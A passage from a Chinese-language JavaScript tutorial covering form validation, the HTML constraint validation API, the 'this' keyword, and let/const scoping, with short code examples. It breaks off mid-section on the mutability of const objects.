<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (myObj !&#x3D;&#x3D; null &amp;&amp; typeof myObj !&#x3D;&#x3D; &quot;undefined&quot;)</span><br></pre></td></tr></table></figure>

<p>正确的方式是我们需要先使用 typeof 来检测对象是否已定义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (typeof myObj !&#x3D;&#x3D; &quot;undefined&quot; &amp;&amp; myObj !&#x3D;&#x3D; null)</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript表单"><a href="#JavaScript表单" class="headerlink" title="JavaScript表单"></a>JavaScript表单</h2><h3 id="JavaScript表单验证"><a href="#JavaScript表单验证" class="headerlink" title="JavaScript表单验证"></a>JavaScript表单验证</h3><p>HTML 表单验证可以通过 JavaScript 来完成。</p>
<p>以下实例代码用于判断表单字段(fname)值是否存在， 如果不存在，就弹出信息，阻止表单提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function validateForm() &#123;</span><br><span class="line">    var x &#x3D; document.forms[&quot;myForm&quot;][&quot;fname&quot;].value;</span><br><span class="line">    if (x &#x3D;&#x3D; null || x &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;需要输入名字。&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上 JavaScript 代码可以通过 HTML 代码来调用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form name&#x3D;&quot;myForm&quot; action&#x3D;&quot;demo_form.php&quot; onsubmit&#x3D;&quot;return validateForm()&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">名字: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JavaScript验证输入的数字"><a href="#JavaScript验证输入的数字" class="headerlink" title="JavaScript验证输入的数字"></a>JavaScript验证输入的数字</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;JavaScript 验证输入&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;请输入 1 到 10 之间的数字：&lt;&#x2F;p&gt;</span><br><span class="line">&lt;input id&#x3D;&quot;numb&quot;&gt;</span><br><span class="line">&lt;button type&#x3D;&quot;button&quot; onclick&#x3D;&quot;myFunction()&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;demo&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    var x, text;</span><br><span class="line">    &#x2F;&#x2F; 获取 id&#x3D;&quot;numb&quot; 的值</span><br><span class="line">    x &#x3D; document.getElementById(&quot;numb&quot;).value;</span><br><span class="line">    &#x2F;&#x2F; 如果输入的值 x 不是数字或者小于 1 或者大于 10，则提示错误 Not a Number or less than one or greater than 10</span><br><span class="line">    if (isNaN(x) || x &lt; 1 || x &gt; 10) &#123;</span><br><span class="line">        text &#x3D; &quot;输入错误&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        text &#x3D; &quot;输入正确&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML &#x3D; text;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="E-mail验证"><a href="#E-mail验证" class="headerlink" title="E-mail验证"></a>E-mail验证</h3><p>下面的函数检查输入的数据是否符合电子邮件地址的基本语法。</p>
<p>意思就是说，输入的数据必须包含 @ 符号和点号(.)。同时，@ 不可以是邮件地址的首字符，并且 @ 之后需有至少一个点号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function validateForm()&#123;</span><br><span class="line">  var x&#x3D;document.forms[&quot;myForm&quot;][&quot;email&quot;].value;</span><br><span class="line">  var atpos&#x3D;x.indexOf(&quot;@&quot;);</span><br><span class="line">  var dotpos&#x3D;x.lastIndexOf(&quot;.&quot;);</span><br><span class="line">  if (atpos&lt;1 || dotpos&lt;atpos+2 || dotpos+2&gt;&#x3D;x.length)&#123;</span><br><span class="line">    alert(&quot;不是一个有效的 e-mail 地址&quot;);</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是连同 HTML 表单的完整代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form name&#x3D;&quot;myForm&quot; action&#x3D;&quot;demo-form.php&quot; onsubmit&#x3D;&quot;return validateForm();&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    Email: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;email&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<h3 id="HTML表单自动验证"><a href="#HTML表单自动验证" class="headerlink" title="HTML表单自动验证"></a>HTML表单自动验证</h3><p>HTML 表单验证也可以通过浏览器来自动完成。</p>
<p>如果表单字段 (fname) 的值为空, <strong>required</strong> 属性会阻止表单提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;demo_form.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot; required&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<h3 id="数据验证"><a href="#数据验证" class="headerlink" title="数据验证"></a>数据验证</h3><p>数据验证用于确保用户输入的数据是有效的。</p>
<p>典型的数据验证有：</p>
<p>必需字段是否有输入?</p>
<p>用户是否输入了合法的数据?</p>
<p>在数字字段是否输入了文本?</p>
<p>大多数情况下，数据验证用于确保用户正确输入数据。</p>
<p>数据验证可以使用不同方法来定义，并通过多种方式来调用。</p>
<p><strong>服务端数据验证</strong>是在数据提交到服务器上后再验证。</p>
<p><strong>客户端数据验证</strong>是在数据发送到服务器前，在浏览器上完成验证。</p>
<h3 id="HTML约束验证"><a href="#HTML约束验证" class="headerlink" title="HTML约束验证"></a>HTML约束验证</h3><p>HTML5 新增了 HTML 表单的验证方式：约束验证（constraint validation）。</p>
<p>约束验证是表单被提交时浏览器用来实现验证的一种算法。</p>
<p>HTML 约束验证基于：</p>
<p><strong>HTML 输入属性</strong></p>
<p><strong>CSS 伪类选择器</strong></p>
<p><strong>DOM 属性和方法</strong></p>
<p>约束验证THML输入属性</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">disabled</td>
<td align="left">规定输入的元素不可用</td>
</tr>
<tr>
<td align="left">max</td>
<td align="left">规定输入元素的最大值</td>
</tr>
<tr>
<td align="left">min</td>
<td align="left">规定输入元素的最小值</td>
</tr>
<tr>
<td align="left">pattern</td>
<td align="left">规定输入元素值的模式</td>
</tr>
<tr>
<td align="left">required</td>
<td align="left">规定输入元素字段是必需的</td>
</tr>
<tr>
<td align="left">type</td>
<td align="left">规定输入元素的类型</td>
</tr>
</tbody></table>
<p>约束验证CSS伪类选择器</p>
<table>
<thead>
<tr>
<th align="left">选择器</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">:disabled</td>
<td align="left">选取属性为 “disabled” 属性的 input 元素</td>
</tr>
<tr>
<td align="left">:invalid</td>
<td align="left">选取无效的 input 元素</td>
</tr>
<tr>
<td align="left">:optional</td>
<td align="left">选择没有”optional”属性的 input 元素</td>
</tr>
<tr>
<td align="left">:required</td>
<td align="left">选择有”required”属性的 input 元素</td>
</tr>
<tr>
<td align="left">:valid</td>
<td align="left">选取有效值的 input 元素</td>
</tr>
</tbody></table>
<h2 id="JavaScript验证API"><a href="#JavaScript验证API" class="headerlink" title="JavaScript验证API"></a>JavaScript验证API</h2><h3 id="约束验证DOM方法"><a href="#约束验证DOM方法" class="headerlink" title="约束验证DOM方法"></a>约束验证DOM方法</h3><table>
<thead>
<tr>
<th align="left">Property</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">checkValidity()</td>
<td align="left">如果 input 元素中的数据是合法的返回 true，否则返回 false。</td>
</tr>
<tr>
<td align="left">setCustomValidity()</td>
<td align="left">设置 input 元素的 validationMessage 属性，用于自定义错误提示信息的方法。使用 setCustomValidity 设置了自定义提示后，validity.customError 就会变成true，则 checkValidity 总是会返回false。如果要重新判断需要取消自定义提示，方式如下：<code>setCustomValidity(&#39;&#39;)  setCustomValidity(null)  setCustomValidity(undefined)</code></td>
</tr>
</tbody></table>
<p>以下实例如果输入信息不合法，则返回错误信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input id&#x3D;&quot;id1&quot; type&#x3D;&quot;number&quot; min&#x3D;&quot;100&quot; max&#x3D;&quot;300&quot; required&gt;</span><br><span class="line">&lt;button onclick&#x3D;&quot;myFunction()&quot;&gt;验证&lt;&#x2F;button&gt;</span><br><span class="line"> </span><br><span class="line">&lt;p id&#x3D;&quot;demo&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    var inpObj &#x3D; document.getElementById(&quot;id1&quot;);</span><br><span class="line">    if (inpObj.checkValidity() &#x3D;&#x3D; false) &#123;</span><br><span class="line">        document.getElementById(&quot;demo&quot;).innerHTML &#x3D; inpObj.validationMessage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>setCustomValidity 的用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var inpObj &#x3D; document.getElementById(&quot;id1&quot;);</span><br><span class="line">inpObj.setCustomValidity(&#39;&#39;); &#x2F;&#x2F; 使用前先取消自定义，否则下次点击checkValidity总返false</span><br><span class="line">if (inpObj.checkValidity() &#x3D;&#x3D; false) &#123;</span><br><span class="line">    if(inpObj.value&#x3D;&#x3D;&quot;&quot;)&#123;</span><br><span class="line">        inpObj.setCustomValidity(&quot;不能为空！&quot;);</span><br><span class="line">    &#125;else if(inpObj.value&lt;100 || inpObj.value&gt;300)&#123;</span><br><span class="line">        inpObj.setCustomValidity(&quot;请重新输入数值（100~300之间）!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML &#x3D; inpObj.validationMessage;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML &#x3D; &quot;输入正确&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="约束验证DOM属性"><a href="#约束验证DOM属性" class="headerlink" title="约束验证DOM属性"></a>约束验证DOM属性</h3><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">validity</td>
<td align="left">布尔属性值，返回 input 输入值是否合法</td>
</tr>
<tr>
<td align="left">validationMessage</td>
<td align="left">浏览器错误提示信息</td>
</tr>
<tr>
<td align="left">willValidate</td>
<td align="left">指定 input 是否需要验证</td>
</tr>
</tbody></table>
<h3 id="Validity属性"><a href="#Validity属性" class="headerlink" title="Validity属性"></a>Validity属性</h3><p>input 元素的 <strong>validity 属性</strong>包含一系列关于 validity 数据属性:</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">customError</td>
<td align="left">设置为 true, 如果设置了自定义的 validity 信息。</td>
</tr>
<tr>
<td align="left">patternMismatch</td>
<td align="left">设置为 true, 如果元素的值不匹配它的模式属性。</td>
</tr>
<tr>
<td align="left">rangeOverflow</td>
<td align="left">设置为 true, 如果元素的值大于设置的最大值。</td>
</tr>
<tr>
<td align="left">rangeUnderflow</td>
<td align="left">设置为 true, 如果元素的值小于它的最小值。</td>
</tr>
<tr>
<td align="left">stepMismatch</td>
<td align="left">设置为 true, 如果元素的值不是按照规定的 step 属性设置。</td>
</tr>
<tr>
<td align="left">tooLong</td>
<td align="left">设置为 true, 如果元素的值超过了 maxLength 属性设置的长度。</td>
</tr>
<tr>
<td align="left">typeMismatch</td>
<td align="left">设置为 true, 如果元素的值不是预期相匹配的类型。</td>
</tr>
<tr>
<td align="left">valueMissing</td>
<td align="left">设置为 true，如果元素 (required 属性) 没有值。</td>
</tr>
<tr>
<td align="left">valid</td>
<td align="left">设置为 true，如果元素的值是合法的。</td>
</tr>
</tbody></table>
<h2 id="JavaScript-this"><a href="#JavaScript-this" class="headerlink" title="JavaScript this"></a>JavaScript this</h2><h3 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h3><p>面向对象语言中 this 表示当前对象的一个引用。</p>
<p>但在 JavaScript 中 this 不是固定不变的，它会随着执行环境的改变而改变。</p>
<ul>
<li>在方法中，this 表示该方法所属的对象。</li>
<li>如果单独使用，this 表示全局对象。</li>
<li>在函数中，this 表示全局对象。</li>
<li>在函数中，在严格模式下，this 是未定义的(undefined)。</li>
<li>在事件中，this 表示接收事件的元素。</li>
<li>类似 call() 和 apply() 方法可以将 this 引用到任何对象。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person &#x3D; &#123;</span><br><span class="line">  firstName: &quot;John&quot;,</span><br><span class="line">  lastName : &quot;Doe&quot;,</span><br><span class="line">  id       : 5566,</span><br><span class="line">  fullName : function() &#123;</span><br><span class="line">    return this.firstName + &quot; &quot; + this.lastName;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="方法中的this"><a href="#方法中的this" class="headerlink" title="方法中的this"></a>方法中的this</h3><p>在对象方法中， this 指向调用它所在方法的对象。</p>
<p>在上面一个实例中，this 表示 person 对象。</p>
<p>fullName 方法所属的对象就是 person。</p>
<h3 id="单独使用this"><a href="#单独使用this" class="headerlink" title="单独使用this"></a>单独使用this</h3><p>单独使用 this，则它指向全局(Global)对象。</p>
<p>在浏览器中，window 就是该全局对象为 [<strong>object Window</strong>]:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; this;</span><br></pre></td></tr></table></figure>

<p>严格模式下，如果单独使用，this 也是指向全局(Global)对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">var x &#x3D; this;</span><br></pre></td></tr></table></figure>

<h3 id="函数中使用this-默认"><a href="#函数中使用this-默认" class="headerlink" title="函数中使用this(默认)"></a>函数中使用this(默认)</h3><p>在函数中，函数的所属者默认绑定到 this 上。</p>
<p>在浏览器中，window 就是该全局对象为 [<strong>object Window</strong>]:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function myFunction() &#123;</span><br><span class="line">  return this;   &#x2F;&#x2F;实例中，this 表示 myFunction 函数的所有者:[object Window]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="函数中使用this-严格模式"><a href="#函数中使用this-严格模式" class="headerlink" title="函数中使用this(严格模式)"></a>函数中使用this(严格模式)</h3><p>严格模式下函数是没有绑定到 this 上，这时候 this 是 <strong>undefined</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">  return this;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* 函数中，默认情况下，this 指向全局对象。严格模式下，this 为 undefined，因为严格模式下不允许默认绑定:undefined *&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="事件中的this"><a href="#事件中的this" class="headerlink" title="事件中的this"></a>事件中的this</h3><p>在 HTML 事件句柄中，this 指向了接收事件的 HTML 元素：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button onclick&#x3D;&quot;this.style.display&#x3D;&#39;none&#39;&quot;&gt;点我后我就消失了&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>

<h3 id="对象方法中绑定"><a href="#对象方法中绑定" class="headerlink" title="对象方法中绑定"></a>对象方法中绑定</h3><p>下面实例中，this 是 person 对象，person 对象是函数的所有者：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person &#x3D; &#123;</span><br><span class="line">  firstName  : &quot;John&quot;,</span><br><span class="line">  lastName   : &quot;Doe&quot;,</span><br><span class="line">  id         : 5566,</span><br><span class="line">  myFunction : function() &#123;</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="显式函数绑定"><a href="#显式函数绑定" class="headerlink" title="显式函数绑定"></a>显式函数绑定</h3><p>在 JavaScript 中函数也是对象，对象则有方法，apply 和 call 就是函数对象的方法。这两个方法异常强大，他们允许切换函数执行的上下文环境（context），即 this 绑定的对象。</p>
<p>在下面实例中，当我们使用 person2 作为参数来调用 person1.fullName 方法时, <strong>this</strong> 将指向 person2, 即便它是 person1 的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var person1 &#x3D; &#123;</span><br><span class="line">  fullName: function() &#123;</span><br><span class="line">    return this.firstName + &quot; &quot; + this.lastName;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var person2 &#x3D; &#123;</span><br><span class="line">  firstName:&quot;John&quot;,</span><br><span class="line">  lastName: &quot;Doe&quot;,</span><br><span class="line">&#125;</span><br><span class="line">person1.fullName.call(person2);  &#x2F;&#x2F; 返回 &quot;John Doe&quot;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript-let和const"><a href="#JavaScript-let和const" class="headerlink" title="JavaScript let和const"></a>JavaScript let和const</h2><p>ECMAScript 2015(ECMAScript 6)<br>ES2015(ES6) 新增加了两个重要的 JavaScript 关键字: let 和 const。</p>
<p>let 声明的变量只在 let 命令所在的代码块内有效。</p>
<p>const 声明一个只读的常量，一旦声明，常量的值就不能改变。</p>
<p>在 ES6 之前，JavaScript 只有两种作用域： 全局变量 与 函数内的局部变量。</p>
<h3 id="JavaScript块级作用域-Block-Scope"><a href="#JavaScript块级作用域-Block-Scope" class="headerlink" title="JavaScript块级作用域(Block Scope)"></a>JavaScript块级作用域(Block Scope)</h3><p>使用 var 关键字声明的变量不具备块级作用域的特性，它在 {} 外依然能被访问到。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    var x &#x3D; 2; </span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 这里可以使用 x 变量</span><br></pre></td></tr></table></figure>

<p>在 ES6 之前，是没有块级作用域的概念的。</p>
<p>ES6 可以使用 let 关键字来实现块级作用域。</p>
<p>let 声明的变量只在 let 命令所在的代码块 <strong>{}</strong> 内有效，在 <strong>{}</strong> 之外不能访问。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    let x &#x3D; 2;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 这里不能使用 x 变量</span><br></pre></td></tr></table></figure>

<h3 id="重新定义变量"><a href="#重新定义变量" class="headerlink" title="重新定义变量"></a>重新定义变量</h3><p>使用 var 关键字重新声明变量可能会带来问题。</p>
<p>在块中重新声明变量也会重新声明块外的变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10;</span><br><span class="line">&#x2F;&#x2F; 这里输出 x 为 10</span><br><span class="line">&#123; </span><br><span class="line">    var x &#x3D; 2;</span><br><span class="line">    &#x2F;&#x2F; 这里输出 x 为 2</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 这里输出 x 为 2</span><br></pre></td></tr></table></figure>

<p>let 关键字就可以解决这个问题，因为它只在 let 命令所在的代码块 <strong>{}</strong> 内有效。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10;</span><br><span class="line">&#x2F;&#x2F; 这里输出 x 为 10</span><br><span class="line">&#123; </span><br><span class="line">    let x &#x3D; 2;</span><br><span class="line">    &#x2F;&#x2F; 这里输出 x 为 2</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 这里输出 x 为 10</span><br></pre></td></tr></table></figure>

<h3 id="循环作用域"><a href="#循环作用域" class="headerlink" title="循环作用域"></a>循环作用域</h3><p>使用 var 关键字：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var i&#x3D;5;</span><br><span class="line">for (var i &#x3D; 0; i &lt; 10 ; i++)&#123;</span><br><span class="line">	&#x2F;&#x2F; 一些代码...</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 这里输出i为10</span><br></pre></td></tr></table></figure>

<p>使用 let 关键字:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let i &#x3D; 5;</span><br><span class="line">for (let i &#x3D; 0; i &lt; 10; i++) &#123;</span><br><span class="line">    &#x2F;&#x2F; 一些代码...</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 这里输出 i 为 5</span><br></pre></td></tr></table></figure>

<p>在第一个实例中，使用了 <strong>var</strong> 关键字，它声明的变量是全局的，包括循环体内与循环体外。</p>
<p>在第二个实例中，使用 <strong>let</strong> 关键字， 它声明的变量作用域只在循环体内，循环体外的变量不受影响。</p>
<h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>在函数体内使用 <strong>var</strong> 和 <strong>let</strong> 关键字声明的变量有点类似。</p>
<p>它们的作用域都是 <strong>局部的</strong>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用 var</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    var carName &#x3D; &quot;Volvo&quot;;   &#x2F;&#x2F; 局部作用域</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 使用 let</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    let carName &#x3D; &quot;Volvo&quot;;   &#x2F;&#x2F;  局部作用域</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>在函数体外或代码块外使用 <strong>var</strong> 和 <strong>let</strong> 关键字声明的变量也有点类似。</p>
<p>它们的作用域都是 <strong>全局的</strong>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用 var</span><br><span class="line">var x &#x3D; 2;       &#x2F;&#x2F; 全局作用域</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 使用 let</span><br><span class="line">let x &#x3D; 2;       &#x2F;&#x2F; 全局作用域</span><br></pre></td></tr></table></figure>

<h3 id="THML代码中使用全局变量"><a href="#THML代码中使用全局变量" class="headerlink" title="THML代码中使用全局变量"></a>THML代码中使用全局变量</h3><p>在 JavaScript 中, 全局作用域是针对 JavaScript 环境。</p>
<p>在 HTML 中, 全局作用域是针对 window 对象。</p>
<p>使用 <strong>var</strong> 关键字声明的全局作用域变量属于 window 对象:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var carName &#x3D; &quot;Volvo&quot;;</span><br><span class="line">&#x2F;&#x2F; 可以使用 window.carName 访问变量</span><br></pre></td></tr></table></figure>

<p>使用 <strong>let</strong> 关键字声明的全局作用域变量不属于 window 对象:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let carName &#x3D; &quot;Volvo&quot;;</span><br><span class="line">&#x2F;&#x2F; 不能使用 window.carName 访问变量</span><br></pre></td></tr></table></figure>

<h3 id="重置变量"><a href="#重置变量" class="headerlink" title="重置变量"></a>重置变量</h3><p>使用 <strong>var</strong> 关键字声明的变量在任何地方都可以修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 2;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; x 为 2</span><br><span class="line"> </span><br><span class="line">var x &#x3D; 3;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 现在 x 为 3</span><br></pre></td></tr></table></figure>

<p>在相同的作用域或块级作用域中，不能使用 <strong>let</strong> 关键字来重置 <strong>var</strong> 关键字声明的变量:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 2;       &#x2F;&#x2F; 合法</span><br><span class="line">let x &#x3D; 3;       &#x2F;&#x2F; 不合法</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    var x &#x3D; 4;   &#x2F;&#x2F; 合法</span><br><span class="line">    let x &#x3D; 5   &#x2F;&#x2F; 不合法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在相同的作用域或块级作用域中，不能使用 <strong>let</strong> 关键字来重置 <strong>let</strong> 关键字声明的变量:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let x &#x3D; 2;       &#x2F;&#x2F; 合法</span><br><span class="line">let x &#x3D; 3;       &#x2F;&#x2F; 不合法</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    let x &#x3D; 4;   &#x2F;&#x2F; 合法</span><br><span class="line">    let x &#x3D; 5;   &#x2F;&#x2F; 不合法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在相同的作用域或块级作用域中，不能使用 <strong>var</strong> 关键字来重置 <strong>let</strong> 关键字声明的变量:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let x &#x3D; 2;       &#x2F;&#x2F; 合法</span><br><span class="line">var x &#x3D; 3;       &#x2F;&#x2F; 不合法</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    let x &#x3D; 4;   &#x2F;&#x2F; 合法</span><br><span class="line">    var x &#x3D; 5;   &#x2F;&#x2F; 不合法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>let</strong> 关键字在不同作用域，或不同块级作用域中是可以重新声明赋值的:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let x &#x3D; 2;       &#x2F;&#x2F; 合法</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    let x &#x3D; 3;   &#x2F;&#x2F; 合法</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    let x &#x3D; 4;   &#x2F;&#x2F; 合法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><p>JavaScript 中，var 关键字定义的变量可以在使用后声明，也就是变量可以先使用再声明。</p>
<p>let 关键字定义的变量则不可以在使用后声明，也就是变量需要先声明再使用。</p>
<h3 id="const关键字"><a href="#const关键字" class="headerlink" title="const关键字"></a>const关键字</h3><p>const 用于声明一个或多个常量，声明时必须进行初始化，且初始化后值不可再修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const PI &#x3D; 3.141592653589793;</span><br><span class="line">PI &#x3D; 3.14;      &#x2F;&#x2F; 报错</span><br><span class="line">PI &#x3D; PI + 10;   &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p><code>const</code>定义常量与使用<code>let</code> 定义的变量相似：</p>
<ul>
<li>二者都是块级作用域</li>
<li>都不能和它所在作用域内的其他变量或函数拥有相同的名称</li>
</ul>
<p>两者还有以下两点区别：</p>
<ul>
<li><code>const</code>声明的常量必须初始化，而<code>let</code>声明的变量不用</li>
<li>const 定义常量的值不能通过再赋值修改，也不能再次声明。而 let 定义的变量值可以修改。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10;</span><br><span class="line">&#x2F;&#x2F; 这里输出 x 为 10</span><br><span class="line">&#123; </span><br><span class="line">    const x &#x3D; 2;</span><br><span class="line">    &#x2F;&#x2F; 这里输出 x 为 2</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 这里输出 x 为 10</span><br></pre></td></tr></table></figure>

<p>const 声明的常量必须初始化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 错误写法</span><br><span class="line">const PI;</span><br><span class="line">PI &#x3D; 3.14159265359;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 正确写法</span><br><span class="line">const PI &#x3D; 3.14159265359;</span><br></pre></td></tr></table></figure>

<h3 id="并非真正的常量"><a href="#并非真正的常量" class="headerlink" title="并非真正的常量"></a>并非真正的常量</h3><p>const 的本质: const 定义的变量并非常量，并非不可变，它定义了一个常量引用一个值。使用 const 定义的对象或者数组，其实是可变的。下面的代码并不会报错：</p>
